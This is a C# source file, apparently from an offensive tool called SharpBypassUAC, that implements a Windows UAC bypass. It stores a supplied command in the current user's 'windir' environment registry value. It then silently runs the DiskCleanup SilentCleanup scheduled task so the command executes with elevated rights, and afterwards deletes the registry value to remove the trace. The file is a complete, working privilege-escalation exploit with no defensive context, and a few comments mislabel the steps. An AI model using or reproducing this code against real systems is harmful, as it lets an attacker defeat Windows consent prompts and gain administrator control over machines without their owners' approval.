using System;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;

namespace SharpBypassUAC
{
    public class DiskCleanup
    {
        public DiskCleanup(byte[] encodedCommand)
        {
            //Credit: https://github.com/gushmazuko/WinBypass/blob/master/DiskCleanupBypass_direct.ps1

            //Check if UAC is set to 'Always Notify'
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            //Convert encoded command to a string
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Check that the command ends in "&& REM"
            if (!command.Contains("REM"))
            {
                Console.WriteLine("Command must end in REM. Exiting...");
                System.Environment.Exit(1);
            }

            //Set the registry key for eventvwr
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Environment", true);
            newkey.SetValue("windir", @command);

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\schtasks.exe";
            p.StartInfo.Arguments = "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteValue("windir");
            return;
        }
    }
}
